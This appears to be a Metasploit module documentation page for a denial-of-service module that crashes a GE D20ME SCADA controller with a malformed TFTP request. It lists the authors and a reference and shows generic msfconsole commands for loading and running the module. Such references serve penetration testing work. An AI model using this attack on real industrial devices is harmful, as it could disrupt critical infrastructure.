## General Electric D20ME TFTP Server Buffer Overflow DoS

By sending a malformed TFTP request to the GE D20ME, it is 
possible to crash the device. This module is based on the 
original 'd20ftpbo.rb' Basecamp module from DigitalBond.


## Module Name
auxiliary/dos/scada/d20_tftp_overflow

## Authors
* K. Reid Wightman <wightman[at]digitalbond.com>
* todb


## References
* http://www.digitalbond.com/tools/basecamp/metasploit-modules/




## Platforms


## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use auxiliary/dos/scada/d20_tftp_overflow
msf auxiliary(d20_tftp_overflow) > show targets
   ... a list of targets ...
msf auxiliary(d20_tftp_overflow) > set TARGET <target-id>
msf auxiliary(d20_tftp_overflow) > show options
   ... show and set options ...
msf auxiliary(d20_tftp_overflow) > run
```
    
    